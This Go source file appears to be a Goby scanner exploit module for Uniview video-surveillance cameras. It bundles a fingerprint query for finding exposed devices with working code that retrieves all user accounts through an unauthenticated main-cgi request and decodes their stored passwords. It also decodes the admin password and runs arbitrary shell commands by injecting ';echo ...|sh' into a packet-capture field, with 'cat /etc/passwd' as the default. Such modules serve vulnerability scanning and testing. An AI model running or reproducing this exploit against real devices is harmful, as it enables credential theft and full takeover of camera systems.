package exploits

import (
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Uniview Video Monitor System main-cgi File Information Leakage Vulnerability",
    "Description": "<p>Uniview high-definition network camera is a high-performance network camera that can transmit and monitor videos over the network. This camera adopts advanced video technology and has characteristics such as high definition, low illumination, and wide dynamic range, which can provide high-quality video images</p><p> The Uniview high-definition network camera has an information leakage vulnerability. Attackers can decrypt the leaked information to obtain administrator account passwords, log in to the background and control the entire system, ultimately causing the system to be in an extremely insecure state</p>",
    "Product": "uniview-Video-Monitoring",
    "Homepage": "http://cn.uniview.com/",
    "DisclosureDate": "2023-08-25",
    "PostTime": "2023-08-25",
    "Author": "vaf",
    "FofaQuery": "(body=\"to=\\\"href_version_div\\\">版本<\" || body=\"gjs_oemtype = \\\"Uniview\") || (server=\"Unisvr \" && body=\"H3CMPP.Lang.DevManage\") || body=\"<!-- <embed src=\\\"null.wav\\\" loop=\" || body=\"var GJS_\" || banner=\"Zhejiang Uniview Technologies Co.\" || title=\"ISC2500\" || title=\"公安图像应用平台\" || body=\"<iframe name=\\\"banner\\\" id=\\\"banner\\\" hidefocus=\\\"hideFocus\\\" marginwidth=\\\"0\\\" marginheight=\\\"0\\\" src=\\\" ../index.htm?clientipaddr=\" || (body=\"isun = true;\" && body=\"id=\\\"userName\\\" onkeypress=\\\"check_username(this)\\\" value=\\\"admin\") || (body=\"<a href=\\\"#\\\" onclick=\\\"popHelp(varHelpAncValue);\\\">\" && body=\"classid=\\\"clsid:0796C71F-AA80-4921-B6D1-AA4252D097AE\\\" id=\\\"recordManager_activeX\") || body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"0; url=cgi-bin/main.cgi?webid=1\\\" />\" || server=\"uniser\" || title=\"国标配置系统\" || (body=\"recordManager_activeX\" && body=\"popHelp(varHelpAncValue);\" ) || (protocol=\"snmp\" && (banner=\"HIC6622X22-5CIR-H\" || banner=\"HIC3121ES-DF36IR\" || banner=\"HIC6621EX22I-5LA-IT\" || banner=\"HIC6622I-HX30IR\" || banner=\"HIC3121ES-DF60IR\")) || banner=\"Uniview login:\" || banner=\"ISC2500-E login:\" || (body=\"cgi-bin/main.cgi?web_id=1&langinfo=-3\" && body=\"<FORM id=loginForm name=loginForm action=cgi-bin/main.cgi method=post >\") || title=\"ISC3500-\" || banner=\"DVR102-16 login:\" || banner=\"HIC6622X22-5CIR\" || banner=\"HIC2221E-CF60IR\" || banner=\"NVR208-32 login:\" || title=\"ISC3616\" || (body=\"<label for='autoLogin' class=\\\"login_autoLoginLabel\\\">\" && body=\"Text.VideoManageSystem\" && body=\"wanlanswitch\") || (protocol=\"snmp\" && banner=\"HC121\") || (body=\"GJS_PRODUCTTYPE\" && (body=\"uniview\" || body=\"宇视\"))",
    "GobyQuery": "(body=\"to=\\\"href_version_div\\\">版本<\" || body=\"gjs_oemtype = \\\"Uniview\") || (server=\"Unisvr \" && body=\"H3CMPP.Lang.DevManage\") || body=\"<!-- <embed src=\\\"null.wav\\\" loop=\" || body=\"var GJS_\" || banner=\"Zhejiang Uniview Technologies Co.\" || title=\"ISC2500\" || title=\"公安图像应用平台\" || body=\"<iframe name=\\\"banner\\\" id=\\\"banner\\\" hidefocus=\\\"hideFocus\\\" marginwidth=\\\"0\\\" marginheight=\\\"0\\\" src=\\\" ../index.htm?clientipaddr=\" || (body=\"isun = true;\" && body=\"id=\\\"userName\\\" onkeypress=\\\"check_username(this)\\\" value=\\\"admin\") || (body=\"<a href=\\\"#\\\" onclick=\\\"popHelp(varHelpAncValue);\\\">\" && body=\"classid=\\\"clsid:0796C71F-AA80-4921-B6D1-AA4252D097AE\\\" id=\\\"recordManager_activeX\") || body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"0; url=cgi-bin/main.cgi?webid=1\\\" />\" || server=\"uniser\" || title=\"国标配置系统\" || (body=\"recordManager_activeX\" && body=\"popHelp(varHelpAncValue);\" ) || (protocol=\"snmp\" && (banner=\"HIC6622X22-5CIR-H\" || banner=\"HIC3121ES-DF36IR\" || banner=\"HIC6621EX22I-5LA-IT\" || banner=\"HIC6622I-HX30IR\" || banner=\"HIC3121ES-DF60IR\")) || banner=\"Uniview login:\" || banner=\"ISC2500-E login:\" || (body=\"cgi-bin/main.cgi?web_id=1&langinfo=-3\" && body=\"<FORM id=loginForm name=loginForm action=cgi-bin/main.cgi method=post >\") || title=\"ISC3500-\" || banner=\"DVR102-16 login:\" || banner=\"HIC6622X22-5CIR\" || banner=\"HIC2221E-CF60IR\" || banner=\"NVR208-32 login:\" || title=\"ISC3616\" || (body=\"<label for='autoLogin' class=\\\"login_autoLoginLabel\\\">\" && body=\"Text.VideoManageSystem\" && body=\"wanlanswitch\") || (protocol=\"snmp\" && banner=\"HC121\") || (body=\"GJS_PRODUCTTYPE\" && (body=\"uniview\" || body=\"宇视\"))",
    "Level": "3",
    "Impact": "<p> The Uniview high-definition network camera has an information leakage vulnerability. Attackers can decrypt the leaked information to obtain administrator account passwords, log in to the background and control the entire system, ultimately causing the system to be in an extremely insecure state</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/\">https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "leakInfo,allUserAccount,userLeakInfo,userAccount,cmd",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "admin",
            "show": "attackType=userAccount"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Information Disclosure"
    ],
    "VulType": [
        "Command Execution",
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "宇视科技视频监控 main-cgi 文件信息泄露漏洞",
            "Product": "uniview-视频监控",
            "Description": "<p>宇视（Uniview）高清网络摄像机是一种高性能的网络摄像机，它可以通过网络进行视频传输和监控。该摄像机采用先进的视频技术，具有高清晰度、低照度、宽动态等特点，能够提供高质量的视频图像。</p><p>宇视（Uniview）高清网络摄像机存在信息泄露漏洞，攻击者可以通过解密泄露信息获取管理员账号密码，登陆后台控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/\" target=\"_blank\">https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/</a></p>",
            "Impact": "<p>宇视（Uniview）高清网络摄像机存在信息泄露漏洞，攻击者可以通过解密泄露信息获取管理员账号密码，登陆后台控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "VulType": [
                "信息泄露",
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Uniview Video Monitor System main-cgi File Information Leakage Vulnerability",
            "Product": "uniview-Video-Monitoring",
            "Description": "<p>Uniview high-definition network camera is a high-performance network camera that can transmit and monitor videos over the network. This camera adopts advanced video technology and has characteristics such as high definition, low illumination, and wide dynamic range, which can provide high-quality video images</p><p> The Uniview high-definition network camera has an information leakage vulnerability. Attackers can decrypt the leaked information to obtain administrator account passwords, log in to the background and control the entire system, ultimately causing the system to be in an extremely insecure state</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/\" target=\"_blank\">https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/</a></p>",
            "Impact": "<p> The Uniview high-definition network camera has an information leakage vulnerability. Attackers can decrypt the leaked information to obtain administrator account passwords, log in to the background and control the entire system, ultimately causing the system to be in an extremely insecure state</p>",
            "VulType": [
                "Command Execution",
                "Information Disclosure"
            ],
            "Tags": [
                "Command Execution",
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10838"
}`
	getAllUserleakInfomationQWOPIEU := func(hostinfo *httpclient.FixUrl) string {
		getRequestConfig := httpclient.NewGetRequestConfig(`/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"`)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostinfo, getRequestConfig)
		if err != nil || !strings.Contains(resp.Utf8Html, "UserPass=") || !strings.Contains(resp.Utf8Html, "UserName=") || !strings.Contains(resp.Utf8Html, "RvsblePass=") || resp.StatusCode != 200 {
			return ""
		}
		return resp.Utf8Html
	}

	decryptAllUserPasswordJQWUOEIH := func(password string) string {
		codeTable := map[string]string{
			"77": "1", "78": "2", "79": "3", "72": "4", "73": "5", "74": "6", "75": "7", "68": "8", "69": "9",
			"76": "0", "93": "!", "60": "@", "95": "#", "88": "$", "89": "%", "34": "^", "90": "&", "86": "*",
			"84": "(", "85": ")", "81": "-", "35": "_", "65": "=", "87": "+", "83": "/", "32": "\\", "0": "|",
			"80": ",", "70": ":", "71": ";", "7": "{", "1": "}", "82": ".", "67": "?", "64": "<", "66": ">",
			"2": "~", "39": "[", "33": "]", "94": "\"", "91": "'", "28": "`", "61": "A", "62": "B", "63": "C",
			"56": "D", "57": "E", "58": "F", "59": "G", "52": "H", "53": "I", "54": "J", "55": "K", "48": "L",
			"49": "M", "50": "N", "51": "O", "44": "P", "45": "Q", "46": "R", "47": "S", "40": "T", "41": "U",
			"42": "V", "43": "W", "36": "X", "37": "Y", "38": "Z", "29": "a", "30": "b", "31": "c", "24": "d",
			"25": "e", "26": "f", "27": "g", "20": "h", "21": "i", "22": "j", "23": "k", "16": "l", "17": "m",
			"18": "n", "19": "o", "12": "p", "13": "q", "14": "r", "15": "s", "8": "t", "9": "u", "10": "v",
			"11": "w", "4": "x", "5": "y", "6": "z",
		}
		var decoded []string
		for _, char := range strings.Split(password, ";") {
			if char != "124" && char != "0" {
				decoded = append(decoded, codeTable[char])
			}
		}
		return strings.Join(decoded, "")
	}

	getAllUserListDQUIOYXAPDJ := func(htmlBody string) []map[string]string {
		reUserName := regexp.MustCompile(`<User Index="\d" UserName="([^"]+)"`)
		reRvsblePass := regexp.MustCompile(`RvsblePass="([^"]+)"`)

		userNames := reUserName.FindAllStringSubmatch(htmlBody, -1)
		rvsblePasses := reRvsblePass.FindAllStringSubmatch(htmlBody, -1)

		userListEncode := make([]map[string]string, len(userNames))
		for i := 0; i < len(userNames); i++ {
			userListEncode[i] = map[string]string{
				"UserName":   userNames[i][1],
				"RvsblePass": rvsblePasses[i][1],
			}
		}
		UserListDecode := make([]map[string]string, len(userNames))
		i := 0
		for _, user := range userListEncode {
			UserListDecode[i] = map[string]string{
				"UserName": user["UserName"],
				"Password": decryptAllUserPasswordJQWUOEIH(rvsblePasses[i][1]),
			}
			i++
		}
		return UserListDecode
	}

	getUserLeakInfomationDJQWIOPJER := func(hostinfo *httpclient.FixUrl, username string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(`/cgi-bin/main-cgi?json={"cmd":201,"szUserName_Qry":"` + username + `","szUserName":"","u32UserLoginHandle":0}`)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostinfo, getRequestConfig)
	}
	decryptUserPasswordDNOUQWIH := func(jsonResp map[string]interface{}) string {
		passIndex := map[int]int{
			1:        1,
			9192090:  2,
			1020910:  3,
			25549780: 4,
			24507899: 5,
			16119889: 6,
			9428219:  7,
			2281891:  8,
			10861120: 9,
			15331742: 10,
			22464897: 11,
			24403461: 12,
			13833575: 13,
			16061285: 14,
			10721046: 15,
			16593252: 16,
			22051260: 17,
			16638739: 18,
			6666540:  19,
			9283102:  20,
			18791719: 21,
			25905184: 22,
			2762182:  23,
			12911758: 24,
			21944959: 25,
			10257708: 26,
			894574:   27,
			16004987: 28,
			12850146: 29,
			8043423:  30,
			7835618:  31,
			18372773: 32,
			9417841:  33,
			18658565: 34,
			10330028: 35,
			13289156: 36,
			23739388: 37,
			12401865: 38,
			15005445: 39,
			10176399: 40,
			10776092: 41,
			16860945: 42,
			5353890:  43,
			2688051:  44,
			39030:    45,
			18708319: 46,
			23920727: 47,
			4762271:  48,
			24294435: 49,
			16720763: 50,
			21207445: 51,
			20598600: 52,
			13303854: 53,
			2666164:  54,
			19813766: 55,
			16041010: 56,
			3127839:  57,
			25260962: 58,
			15859882: 59,
			23452596: 60,
			11396657: 61,
			18994119: 62,
			12423246: 63,
			21498126: 64,
			23593931: 65,
			9818447:  66,
			14937061: 67,
			24683641: 68,
			11058089: 69,
			12800298: 70,
			133183:   71,
			26013724: 72,
			19021449: 73,
			25487361: 74,
			3426696:  75,
			22326185: 76,
			9151922:  77,
			20416123: 78,
			13876302: 79,
			497003:   80,
			18662430: 81,
			7306818:  82,
			24323487: 83,
			26110937: 84,
			5380058:  85,
			21481095: 86,
			9540458:  87,
			14123621: 88,
			6847253:  89,
			7638896:  90,
			22385568: 91,
			1208753:  92,
			15383366: 93,
			24719837: 94,
			26729699: 95,
			3594142:  96,
			371291:   97,
			23345327: 98,
			4415431:  99,
			6477625:  100,
			4733341:  101,
			13423221: 102,
			24215867: 103,
			7503741:  104,
			6390751:  105,
			10192199: 106,
			10352855: 107,
			22393893: 108,
			7198498:  109,
			12838108: 110,
			5515125:  111,
			7229843:  112,
			13872090: 113,
			21671745: 114,
			12457317: 115,
			26153875: 116,
			14327497: 117,
			11382568: 118,
			10132668: 119,
			20086929: 120,
			8117696:  121,
			2098389:  122,
			21553350: 123,
			23391670: 124,
			25350683: 125,
			25970062: 126,
			6959731:  127,
			16338714: 128,
		}
		pwdIntSlice := jsonResp["au32LoginPasswd"].([]interface{})
		var auPwd []int
		for _, pwdInt := range pwdIntSlice {
			if pwdInt.(float64) == 0 {
				break
			}
			auPwd = append(auPwd, passIndex[int(pwdInt.(float64))])
		}
		password := ""
		for _, pwdInt := range auPwd {
			password += string(rune(pwdInt))
		}
		return password
	}

	getUserDecodePasswordDNUOQIWHE := func(respBody string) map[string]string {
		resJSON := make(map[string]interface{})
		err := json.Unmarshal([]byte(respBody), &resJSON)
		if err != nil {
			fmt.Println(err)
			return nil
		}

		_, ok := resJSON["szLoginPasswd"].(string)
		if !ok {
			return nil
		}

		plainPass := decryptUserPasswordDNOUQWIH(resJSON)
		if plainPass == "" {
			return nil
		}
		return map[string]string{
			"user":     "admin",
			"password": plainPass,
		}
	}

	executeCommandDNQOIWEH := func(hostinfo *httpclient.FixUrl, cmd string) string {
		getRequestExecuteConfig := httpclient.NewGetRequestConfig(fmt.Sprintf(`/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":";echo%%20\"%s\"|sh%%20>/tmp/packetcapture.pcap%%202>%%261;"}`, cmd))
		executeResp, err := httpclient.DoHttpRequest(hostinfo, getRequestExecuteConfig)
		if err != nil || executeResp.StatusCode != 200 || !strings.Contains(executeResp.Utf8Html, `"code":`) || !strings.Contains(executeResp.Utf8Html, `"success":`) || !strings.Contains(executeResp.Utf8Html, `true`) {
			return ""
		}
		getRequestResultConfig := httpclient.NewGetRequestConfig(`/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}`)
		resultsResp, err := httpclient.DoHttpRequest(hostinfo, getRequestResultConfig)
		if err != nil || len(resultsResp.Utf8Html) < 1 || resultsResp.StatusCode != 200 {
			return ""
		}
		return resultsResp.Utf8Html
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			return len(getAllUserleakInfomationQWOPIEU(hostInfo)) > 0
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			username := goutils.B2S(stepLogs.Params["username"])
			if len(username) < 1 {
				username = "admin"
			}
			if attackType == "leakInfo" || attackType == "allUserAccount" {
				respBody := getAllUserleakInfomationQWOPIEU(expResult.HostInfo)
				if len(respBody) > 0 && attackType == "leakInfo" {
					expResult.Success = true
					expResult.Output = respBody
					expResult.OutputType = "html"
					return expResult
				} else if len(respBody) > 0 && attackType == "allUserAccount" {
					allUserInfo := getAllUserListDQUIOYXAPDJ(respBody)
					if len(allUserInfo) < 1 {
						return expResult
					}
					for _, userinfo := range allUserInfo {
						expResult.Output += "Username: " + userinfo["UserName"] + "  Password: " + userinfo["Password"] + "\n"
					}
					expResult.Success = true
					return expResult
				}
			}
			if attackType == "userLeakInfo" {
				resp, _ := getUserLeakInfomationDJQWIOPJER(expResult.HostInfo, username)
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "u8UserBasePermission") && strings.Contains(resp.Utf8Html, "u8UserBasePermission") {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			} else if attackType == "userAccount" {
				resp, _ := getUserLeakInfomationDJQWIOPJER(expResult.HostInfo, username)
				accountInfo := getUserDecodePasswordDNUOQIWHE(resp.Utf8Html)
				if len(accountInfo["password"]) > 0 {
					expResult.Success = true
					expResult.Output = "Username: " + accountInfo["user"] + "\nPassword: " + accountInfo["password"]
				}
			} else if attackType == "cmd" {
				commandResult := executeCommandDNQOIWEH(expResult.HostInfo, url.QueryEscape(strings.ReplaceAll(stepLogs.Params["cmd"].(string),`"`,`\"`)))
				if len(commandResult) >= 1 {
					expResult.Success = true
					expResult.Output = commandResult
				}
			}
			return expResult
		},
	))
}
